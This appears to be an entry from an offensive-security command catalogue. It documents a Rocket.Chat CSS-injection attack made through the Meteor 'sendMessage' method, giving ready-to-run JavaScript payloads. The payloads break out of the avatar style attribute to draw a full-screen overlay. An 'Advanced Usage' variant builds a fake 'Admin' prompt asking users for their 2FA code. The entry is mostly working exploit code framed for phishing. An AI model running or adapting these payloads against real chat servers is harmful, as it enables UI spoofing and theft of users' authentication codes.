---
id: cmd-meteor-css-001
name: meteor-sendmessage-css-injection
type: command
executor: javascript
data: |-
  Meteor.call("sendMessage", {
    rid: "<ROOM OR DM ID>",
    avatar: "none);position:fixed;top:0;right:0;bottom:0;left:0;z-index:999;background-color:black;opacity:0.5;pointer-events:none;",
    msg: "Enjoy the Dark Theme!",
    alias: "hacker"
  });
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:09.259Z'
platforms:
  - Web
tags:
  - css-injection
  - meteor
  - rocket-chat
verified: false
validated: true
submitted: true
---

# meteor-sendmessage-css-injection

## Command

```javascript
Meteor.call("sendMessage", {
  rid: "<ROOM OR DM ID>",
  avatar: "none);position:fixed;top:0;right:0;bottom:0;left:0;z-index:999;background-color:black;opacity:0.5;pointer-events:none;",
  msg: "Enjoy the Dark Theme!",
  alias: "hacker"
});
```

## Description

This JavaScript command exploits CSS injection in Rocket.Chat by calling the Meteor 'sendMessage' method with a malicious avatar payload. It closes the existing style attribute and injects CSS for a fixed-position overlay, useful for UI manipulation and phishing in authenticated sessions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| rid | Room or DM ID targeting the message | Yes |
| avatar | Malicious string: closes style with 'none);' and adds CSS properties for overlay | Yes |
| msg | Visible message text in the chat | Yes |
| alias | Sender display name | Yes |

## Examples

### Basic Usage

```javascript
Meteor.call("sendMessage", {
  rid: "GENERAL",
  avatar: "none);position:fixed;top:0;right:0;bottom:0;left:0;z-index:999;background-color:black;opacity:0.5;pointer-events:none;",
  msg: "Enjoy the Dark Theme!",
  alias: "hacker"
});
```

### Advanced Usage

For phishing overlay, modify avatar to include form-like elements:

```javascript
Meteor.call("sendMessage", {
  rid: "GENERAL",
  avatar: "none);position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:999;background:white;padding:20px;border:1px solid black;",
  msg: "Enter 2FA:",
  alias: "Admin"
});
```

## Expected Output

The command returns a success response from Meteor (e.g., no error in console), and the message appears in the chat with the injected CSS applied, resulting in a visible UI overlay like a semi-transparent black background covering the page.

## Related

- [[Related Procedure: Exploit-CSS-Injection-in-Rocket-Chat-Avatars]]
